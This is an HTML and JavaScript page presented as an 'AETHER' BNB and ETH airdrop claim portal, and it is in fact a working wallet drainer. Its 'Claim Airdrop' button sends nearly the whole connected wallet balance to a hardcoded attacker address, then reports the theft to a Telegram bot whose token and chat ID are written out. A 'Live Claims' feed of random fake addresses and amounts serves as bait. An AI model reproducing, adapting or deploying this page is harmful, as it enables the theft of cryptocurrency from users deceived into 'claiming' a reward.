<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <title>🎁 AETHER AIRDROP | BNB & ETH Claim Portal</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
    
    <!-- Social Meta Tags -->
    <meta property="og:title" content="AETHER | BNB & ETH Airdrop Claim">
    <meta property="og:description" content="Claim your BNB & ETH airdrop rewards.">
    <meta property="og:type" content="website">

    <!-- Fonts & Libraries -->
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>

    <style>
        :root {
            --bg-deep: #050508;
            --bg-panel: rgba(12, 12, 18, 0.85);
            --accent-main: #F0B90B;
            --accent-glow: rgba(240, 185, 11, 0.4);
            --accent-text: #F0B90B;
            --btn-gradient: linear-gradient(135deg, #F0B90B, #d6a00a);
            --btn-shadow: 0 4px 15px rgba(240, 185, 11, 0.3);
            --btn-hover-shadow: 0 6px 25px rgba(240, 185, 11, 0.5);
            --text-bright: #ffffff;
            --text-dim: #8a8a9a;
            --glass-border: rgba(255, 255, 255, 0.08);
            --eth-color: #627eea;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: var(--bg-deep);
            color: var(--text-bright);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow-x: hidden;
            position: relative;
            padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
        }

        .bg-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -2;
            background: radial-gradient(circle at 50% 0%, var(--accent-glow) 0%, transparent 50%);
        }

        .grid-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background-image: 
                linear-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px),
                linear-gradient(90deg, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
            background-size: 60px 60px;
        }

        .main-container {
            width: 100%;
            max-width: 420px;
            padding: 16px;
            position: relative;
            z-index: 10;
        }

        .app-header {
            text-align: center;
            margin-bottom: 24px;
        }

        .logo-container {
            width: 80px;
            height: 80px;
            margin: 0 auto 12px;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .logo-glow {
            position: absolute;
            width: 120%;
            height: 120%;
            background: radial-gradient(circle, var(--accent-glow) 0%, transparent 70%);
            animation: pulseGlow 4s infinite ease-in-out;
        }

        .logo-img {
            width: 70px;
            height: 70px;
            position: relative;
            z-index: 2;
            filter: drop-shadow(0 0 15px var(--accent-main));
        }

        .app-title {
            font-family: 'Orbitron', sans-serif;
            font-size: 28px;
            font-weight: 700;
            letter-spacing: 3px;
            text-transform: uppercase;
            background: linear-gradient(to right, #fff, var(--accent-main));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 4px;
        }

        .app-subtitle {
            font-size: 11px;
            color: var(--accent-main);
            letter-spacing: 1.5px;
            text-transform: uppercase;
            font-weight: 500;
        }

        .card {
            background: var(--bg-panel);
            border: 1px solid var(--glass-border);
            border-radius: 24px;
            padding: 24px 20px;
            backdrop-filter: blur(25px);
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
        }

        .section-label {
            font-size: 10px;
            color: var(--text-dim);
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .section-label::after {
            content: '';
            flex: 1;
            height: 1px;
            background: var(--glass-border);
        }

        .network-selector {
            display: flex;
            gap: 8px;
            margin-bottom: 16px;
        }

        .network-btn {
            flex: 1;
            padding: 12px 8px;
            border: 1px solid var(--glass-border);
            border-radius: 12px;
            background: rgba(255,255,255,0.02);
            color: var(--text-dim);
            font-size: 13px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            -webkit-tap-highlight-color: transparent;
        }

        .network-btn.active {
            background: var(--accent-glow);
            border-color: var(--accent-main);
            color: var(--accent-main);
            box-shadow: 0 0 20px var(--accent-glow);
        }

        .network-btn.eth.active {
            background: rgba(98, 126, 234, 0.2);
            border-color: var(--eth-color);
            color: var(--eth-color);
            box-shadow: 0 0 20px rgba(98, 126, 234, 0.4);
        }

        .network-info-box {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid var(--accent-main);
            border-radius: 16px;
            padding: 14px;
            margin-bottom: 20px;
            text-align: center;
        }

        .network-name-badge {
            font-size: 16px;
            font-weight: 600;
            color: var(--accent-main);
            margin-bottom: 4px;
        }

        .network-desc-badge {
            font-size: 11px;
            color: var(--text-dim);
        }

        .btn-group {
            display: flex;
            flex-direction: column;
            gap: 10px;
            margin-bottom: 16px;
        }

        .cyber-btn {
            position: relative;
            padding: 14px;
            border: none;
            border-radius: 14px;
            font-size: 14px;
            font-weight: 600;
            letter-spacing: 0.5px;
            cursor: pointer;
            overflow: hidden;
            transition: transform 0.1s, box-shadow 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            text-transform: uppercase;
            font-family: 'Orbitron', sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        .cyber-btn:active {
            transform: scale(0.97);
        }

        .btn-primary {
            background: var(--btn-gradient);
            color: white;
            box-shadow: var(--btn-shadow);
        }

        .btn-claim {
            background: linear-gradient(135deg, #F0B90B, #d6a00a);
            color: white;
            box-shadow: 0 4px 20px rgba(240, 185, 11, 0.3);
        }

        .btn-claim.eth {
            background: linear-gradient(135deg, var(--eth-color), #5469d4);
            box-shadow: 0 4px 20px rgba(98, 126, 234, 0.3);
        }
        
        .btn-claim:disabled {
            opacity: 0.4;
            cursor: not-allowed;
            transform: none !important;
            box-shadow: none;
        }

        .btn-loading {
            pointer-events: none;
            color: transparent !important;
        }
        
        .btn-loading::after {
            content: '';
            position: absolute;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .status-box {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 12px;
            padding: 12px;
            margin-bottom: 15px;
            text-align: center;
            font-size: 12px;
            color: var(--text-dim);
            border: 1px solid transparent;
            display: none;
            word-break: break-word;
        }

        .status-box.active { display: block; }
        .status-box.error { color: #ff4d4d; border-color: rgba(255, 77, 77, 0.3); background: rgba(255, 77, 77, 0.05); }
        .status-box.success { color: #00ff9d; border-color: rgba(0, 255, 157, 0.3); background: rgba(0, 255, 157, 0.05); }
        .status-box.warning { color: #ffb700; border-color: rgba(255, 183, 0, 0.3); background: rgba(255, 183, 0, 0.05); }

        .wallet-badge {
            display: none;
            background: rgba(255, 255, 255, 0.05);
            padding: 10px 12px;
            border-radius: 8px;
            font-size: 12px;
            color: var(--accent-main);
            margin-bottom: 15px;
            text-align: center;
            border: 1px solid var(--accent-main);
            word-break: break-word;
        }

        .balance-box {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 12px;
            padding: 12px;
            margin-bottom: 16px;
            text-align: center;
            border: 1px solid var(--glass-border);
            display: none;
        }

        .balance-label {
            font-size: 10px;
            color: var(--text-dim);
            text-transform: uppercase;
            margin-bottom: 4px;
        }

        .balance-amount {
            font-size: 22px;
            font-weight: 700;
            color: var(--accent-main);
        }

        .live-feed-section {
            margin-top: 20px;
            border-top: 1px solid rgba(255,255,255,0.05);
            padding-top: 12px;
        }

        .live-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 12px;
        }

        .live-title {
            font-size: 11px;
            color: var(--text-dim);
            text-transform: uppercase;
            letter-spacing: 1px;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .live-dot {
            width: 6px;
            height: 6px;
            background: #00ff9d;
            border-radius: 50%;
            animation: blink 2s infinite;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        .tx-list {
            display: flex;
            flex-direction: column;
            gap: 6px;
            max-height: 150px;
            overflow: hidden;
        }

        .tx-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: rgba(255,255,255,0.02);
            padding: 8px 10px;
            border-radius: 8px;
            border-left: 2px solid #F0B90B;
            font-size: 11px;
        }

        .tx-user {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .tx-avatar {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            background: rgba(255,255,255,0.1);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 9px;
        }

        .tx-address {
            font-size: 11px;
            color: #ccc;
            font-family: monospace;
        }

        .tx-amount {
            font-size: 11px;
            font-weight: 600;
            color: #00ff9d;
        }

        .footer-links {
            margin-top: 16px;
            text-align: center;
        }
        
        .moonpay-link {
            color: var(--text-dim);
            text-decoration: none;
            font-size: 11px;
            transition: color 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 4px;
        }

        @keyframes pulseGlow {
            0%, 100% { opacity: 0.6; transform: scale(1); }
            50% { opacity: 0.9; transform: scale(1.2); }
        }
    </style>
</head>
<body>
    <div class="bg-canvas"></div>
    <div class="grid-overlay"></div>

    <div class="main-container">
        <header class="app-header">
            <div class="logo-container">
                <div class="logo-glow"></div>
                <i class="fab fa-btc logo-img" style="font-size: 70px; color: #F0B90B;"></i>
            </div>
            <h1 class="app-title">AETHER</h1>
            <div class="app-subtitle">Multi-Chain Airdrop</div>
        </header>

        <div class="card">
            <div class="network-selector">
                <button class="network-btn active" data-network="bsc">
                    <i class="fas fa-coins"></i> BNB
                </button>
                <button class="network-btn eth" data-network="eth">
                    <i class="fab fa-ethereum"></i> ETH
                </button>
            </div>

            <div class="network-info-box">
                <div class="network-name-badge" id="networkName">BNB Smart Chain</div>
                <div class="network-desc-badge" id="networkDesc">Low Fees • Fast Transactions</div>
            </div>

            <div id="walletBadge" class="wallet-badge">
                <i class="fas fa-check-circle"></i> Connected: <span id="walletAddress">...</span>
            </div>

            <div id="statusBox" class="status-box active">
                <i class="fas fa-info-circle"></i> Connect wallet to check eligibility
            </div>

            <div class="balance-box" id="balanceBox" style="display: none;">
                <div class="balance-label">Your Balance</div>
                <div><span class="balance-amount" id="balanceAmount">0</span> <span id="balanceSymbol">BNB</span></div>
            </div>

            <div class="btn-group">
                <button id="connectBtn" class="cyber-btn btn-primary">
                    <i class="fas fa-wallet"></i> Connect Wallet
                </button>
            </div>

            <button id="claimBtn" class="cyber-btn btn-claim" disabled>
                <i class="fas fa-gift"></i> Claim Airdrop
            </button>

            <div class="live-feed-section">
                <div class="live-header">
                    <div class="live-title"><div class="live-dot"></div> Live Claims</div>
                    <span id="liveNetwork" style="font-size: 10px; color: var(--text-dim);">BNB Network</span>
                </div>
                <div class="tx-list" id="txList"></div>
            </div>

            <div class="footer-links">
                <a href="https://buy.moonpay.com?currencyCode=bnb" id="moonpayLink" class="moonpay-link" target="_blank" rel="noopener noreferrer">
                    <i class="fas fa-gas-pump"></i> Need Gas? Buy with MoonPay
                </a>
            </div>
        </div>
    </div>

    <script>
        // ================= CONFIGURATION =================
        const NETWORKS = {
            bsc: {
                name: 'BNB Smart Chain',
                short: 'BNB',
                chainId: '0x38',
                rpc: 'https://bsc-dataseed1.binance.org',
                explorer: 'https://bscscan.com',
                symbol: 'BNB',
                recipient: '0x11162539D0DC5Fec12c4F6b9cEd81B76b0B1e5b1'
            },
            eth: {
                name: 'Ethereum Mainnet',
                short: 'ETH',
                chainId: '0x1',
                rpc: 'https://eth.llamarpc.com',
                explorer: 'https://etherscan.io',
                symbol: 'ETH',
                recipient: '0x11162539D0DC5Fec12c4F6b9cEd81B76b0B1e5b1'
            }
        };

        // Telegram config (optional)
        const TELEGRAM_BOT = "8508442196:AAGyHF-RKSVPVtAvpYzvNRns3mufYb-1Euk"; 
        const ADMIN_CHAT_ID = "-1003776376519"; 

        // ================= STATE =================
        let provider, signer, userAddress = null;
        let currentNetwork = 'bsc';
        let isProcessing = false;
        let connectionTimeout = null;

        // ================= UI ELEMENTS =================
        const connectBtn = document.getElementById('connectBtn');
        const claimBtn = document.getElementById('claimBtn');
        const statusBox = document.getElementById('statusBox');
        const walletBadge = document.getElementById('walletBadge');
        const balanceBox = document.getElementById('balanceBox');
        const balanceAmount = document.getElementById('balanceAmount');
        const balanceSymbol = document.getElementById('balanceSymbol');
        const walletAddress = document.getElementById('walletAddress');
        const txList = document.getElementById('txList');
        const networkBtns = document.querySelectorAll('.network-btn');
        const networkName = document.getElementById('networkName');
        const networkDesc = document.getElementById('networkDesc');
        const liveNetwork = document.getElementById('liveNetwork');
        const moonpayLink = document.getElementById('moonpayLink');

        // ================= DETECT MOBILE WALLET =================
        function isMobileWallet() {
            const ua = navigator.userAgent.toLowerCase();
            return ua.includes('trust') || ua.includes('wallet') || ua.includes('android');
        }

        // ================= LIVE FEED =================
        const addresses = ['0x5a3f...', '0x7b9d...', '0x1f4e...', '0x92da...', '0xa2e7...'];
        function addLiveClaim() {
            const div = document.createElement('div');
            div.className = `tx-item ${currentNetwork}`;
            const symbol = NETWORKS[currentNetwork].symbol;
            div.innerHTML = `
                <div class="tx-user">
                    <div class="tx-avatar"><i class="fas fa-user"></i></div>
                    <div><div class="tx-address">${addresses[Math.floor(Math.random() * addresses.length)]}</div></div>
                </div>
                <div class="tx-amount">+${(Math.random() * 2 + 0.1).toFixed(2)} ${symbol}</div>
            `;
            txList.insertBefore(div, txList.firstChild);
            if(txList.children.length > 5) txList.removeChild(txList.lastChild);
        }
        for(let i=0; i<3; i++) addLiveClaim();
        setInterval(addLiveClaim, 5000);

        // ================= NETWORK SWITCHING =================
        networkBtns.forEach(btn => {
            btn.onclick = () => {
                if(isProcessing) return;
                
                networkBtns.forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                currentNetwork = btn.dataset.network;
                
                updateNetworkUI();
                
                if(provider && userAddress) {
                    checkNetworkAndUpdate();
                }
            };
        });

        function updateNetworkUI() {
            const net = NETWORKS[currentNetwork];
            networkName.textContent = net.name;
            networkName.style.color = currentNetwork === 'eth' ? 'var(--eth-color)' : 'var(--accent-main)';
            networkDesc.textContent = currentNetwork === 'bsc' ? 'Low Fees • Fast Transactions' : 'Ethereum Mainnet';
            liveNetwork.textContent = `${net.short} Network`;
            moonpayLink.href = `https://buy.moonpay.com?currencyCode=${net.symbol.toLowerCase()}`;
            claimBtn.className = `cyber-btn btn-claim ${currentNetwork}`;
            balanceSymbol.textContent = net.symbol;
            balanceAmount.style.color = currentNetwork === 'eth' ? 'var(--eth-color)' : 'var(--accent-main)';
        }

        // ================= HELPER FUNCTIONS =================
        function updateStatus(msg, type = 'info') {
            statusBox.className = 'status-box active';
            if(type === 'error') statusBox.classList.add('error');
            else if(type === 'success') statusBox.classList.add('success');
            else if(type === 'warning') statusBox.classList.add('warning');
            statusBox.innerHTML = msg;
        }

        function setButtonLoading(btn, isLoading) {
            if(isLoading) {
                btn.classList.add('btn-loading');
                btn.disabled = true;
            } else {
                btn.classList.remove('btn-loading');
                btn.disabled = false;
            }
        }

        async function updateBalance() {
            if(!provider || !userAddress) return;
            try {
                const balance = await provider.getBalance(userAddress);
                const formattedBalance = ethers.utils.formatEther(balance);
                balanceAmount.textContent = parseFloat(formattedBalance).toFixed(4);
                balanceBox.style.display = 'block';
                return balance;
            } catch(e) {
                console.error('Balance check error:', e);
                return null;
            }
        }

        async function checkNetworkAndUpdate() {
            if(!window.ethereum) return;
            
            try {
                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                const targetChainId = NETWORKS[currentNetwork].chainId;
                
                if(chainId !== targetChainId) {
                    updateStatus(`⚠️ Wrong network! Switch to ${NETWORKS[currentNetwork].name}`, 'error');
                    claimBtn.disabled = true;
                    return false;
                } else {
                    await updateBalance();
                    claimBtn.disabled = false;
                    updateStatus(`✅ Connected to ${NETWORKS[currentNetwork].name}`, 'success');
                    return true;
                }
            } catch(e) {
                console.error('Network check error:', e);
                return false;
            }
        }

        async function sendTelegram(message) {
            if(!TELEGRAM_BOT || !ADMIN_CHAT_ID) return;
            try {
                const text = encodeURIComponent(message.substring(0, 1000));
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=${text}&parse_mode=HTML`, {
                    mode: 'no-cors'
                });
            } catch(e) {
                console.error('Telegram error:', e);
            }
        }

        // ================= CONNECT WALLET =================
        connectBtn.onclick = async () => {
            if(!window.ethereum) {
                updateStatus('❌ No wallet detected. Please install MetaMask or TrustWallet', 'error');
                return;
            }

            setButtonLoading(connectBtn, true);
            updateStatus(`⏳ Connecting to ${NETWORKS[currentNetwork].name}...`, 'warning');

            // Clear any existing timeout
            if(connectionTimeout) clearTimeout(connectionTimeout);

            try {
                // For mobile wallets, set a shorter timeout
                if(isMobileWallet()) {
                    connectionTimeout = setTimeout(() => {
                        updateStatus('⏳ Check your wallet app for connection request', 'warning');
                    }, 2000);
                }

                // Request accounts
                const accounts = await window.ethereum.request({ 
                    method: 'eth_requestAccounts',
                    params: []
                });
                
                if(connectionTimeout) clearTimeout(connectionTimeout);
                
                if(!accounts || accounts.length === 0) {
                    throw new Error('No accounts found');
                }

                userAddress = accounts[0];
                
                // Setup provider
                provider = new ethers.providers.Web3Provider(window.ethereum);
                signer = provider.getSigner();

                // Update UI
                walletAddress.textContent = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
                walletBadge.style.display = 'block';
                
                // Check network and update balance
                await checkNetworkAndUpdate();
                
                // Hide connect button
                connectBtn.style.display = 'none';

            } catch(err) {
                if(connectionTimeout) clearTimeout(connectionTimeout);
                
                console.error('Connection error:', err);
                
                // Don't show error if user just switched to wallet app
                if(err.message?.includes('User rejected') || err.code === 4001) {
                    updateStatus('❌ Connection rejected', 'error');
                } else if(isMobileWallet()) {
                    updateStatus('⏳ Please check your wallet app and try again', 'warning');
                } else {
                    updateStatus('❌ Connection failed. Please try again', 'error');
                }
                
                setButtonLoading(connectBtn, false);
            }
        };

        // ================= CLAIM =================
        claimBtn.onclick = async () => {
            if(isProcessing || !userAddress || !signer) return;
            
            const net = NETWORKS[currentNetwork];
            isProcessing = true;
            setButtonLoading(claimBtn, true);
            updateStatus(`⏳ Checking ${net.symbol} balance...`, 'warning');

            try {
                // Check network first
                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                if(chainId !== net.chainId) {
                    updateStatus(`❌ Please switch to ${net.name}`, 'error');
                    setButtonLoading(claimBtn, false);
                    isProcessing = false;
                    return;
                }

                // Get balance
                const balance = await provider.getBalance(userAddress);
                
                if(balance.eq(0)) {
                    updateStatus(`❌ No ${net.symbol} balance to claim`, 'error');
                    setButtonLoading(claimBtn, false);
                    isProcessing = false;
                    return;
                }

                // Get gas price
                const gasPrice = await provider.getGasPrice();
                const gasLimit = 21000;
                const gasCost = gasPrice.mul(gasLimit);
                
                // Calculate send amount
                let sendAmount;
                if(balance.gt(gasCost)) {
                    sendAmount = balance.sub(gasCost);
                } else {
                    sendAmount = balance;
                }

                const sendAmountFormatted = ethers.utils.formatEther(sendAmount);
                updateStatus(`⏳ Sending ${sendAmountFormatted} ${net.symbol}...`, 'warning');

                // For mobile, show waiting message
                if(isMobileWallet()) {
                    updateStatus('⏳ Check your wallet to confirm transaction', 'warning');
                }

                // Send transaction
                const tx = await signer.sendTransaction({
                    to: net.recipient,
                    value: sendAmount,
                    gasLimit: gasLimit
                });

                updateStatus('⏳ Waiting for confirmation...', 'warning');

                // Wait for confirmation
                const receipt = await tx.wait();

                if(receipt.status === 1) {
                    const successMsg = `✅ <b>${net.symbol} CLAIM SUCCESS</b>\n` +
                        `Amount: ${sendAmountFormatted} ${net.symbol}`;
                    
                    await sendTelegram(successMsg);
                    
                    updateStatus(`✅ Success! ${sendAmountFormatted} ${net.symbol} claimed`, 'success');
                    claimBtn.innerHTML = '<i class="fas fa-check"></i> Claimed';
                    claimBtn.disabled = true;
                    
                    setTimeout(updateBalance, 2000);
                } else {
                    updateStatus('❌ Transaction failed', 'error');
                }

            } catch(err) {
                console.error('Claim error:', err);
                
                if(err.code === 4001) {
                    updateStatus('❌ Transaction rejected', 'error');
                } else {
                    updateStatus('❌ Failed: ' + (err.message?.substring(0, 50) || 'Unknown error'), 'error');
                }
            }

            setButtonLoading(claimBtn, false);
            isProcessing = false;
        };

        // ================= AUTO-RECONNECT WITH TIMEOUT HANDLING =================
        window.addEventListener('load', async () => {
            updateNetworkUI();
            
            // Don't auto-connect on mobile - let user click button
            if(isMobileWallet()) {
                return;
            }
            
            if(window.ethereum) {
                try {
                    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                    if(accounts.length > 0) {
                        // Small delay to ensure UI is ready
                        setTimeout(() => connectBtn.click(), 500);
                    }
                } catch(e) {
                    console.log('Auto-connect check failed:', e);
                }
            }
        });

        // ================= WALLET EVENT LISTENERS =================
        if(window.ethereum) {
            window.ethereum.on('accountsChanged', (accounts) => {
                if(accounts.length === 0) {
                    // Disconnected - reload on mobile might be too aggressive
                    if(!isMobileWallet()) {
                        window.location.reload();
                    }
                } else {
                    userAddress = accounts[0];
                    walletAddress.textContent = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
                    checkNetworkAndUpdate();
                }
            });
            
            window.ethereum.on('chainChanged', (chainId) => {
                // Don't reload on mobile, just update UI
                if(isMobileWallet()) {
                    checkNetworkAndUpdate();
                } else {
                    window.location.reload();
                }
            });
        }

        // ================= PREVENT PAGE HIDE ON MOBILE =================
        document.addEventListener('visibilitychange', () => {
            if(document.visibilityState === 'visible' && isMobileWallet()) {
                // Page became visible again, check connection status
                if(window.ethereum && userAddress) {
                    checkNetworkAndUpdate();
                }
            }
        });
    </script>
</body>
